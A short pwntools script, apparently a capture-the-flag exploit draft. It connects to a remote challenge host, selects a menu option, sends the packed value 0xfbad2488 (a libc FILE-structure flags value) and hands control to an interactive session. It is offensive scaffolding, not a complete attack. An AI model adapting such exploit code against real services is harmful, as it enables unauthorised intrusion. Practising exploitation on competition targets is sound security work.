from pwn import *

p = remote("110.10.147.104",13152)


p.recvuntil("around\n")
p.sendline("1")

p.recvuntil("test 1\n")

p.sendline(p64(0xfbad2488))
p.interactive()
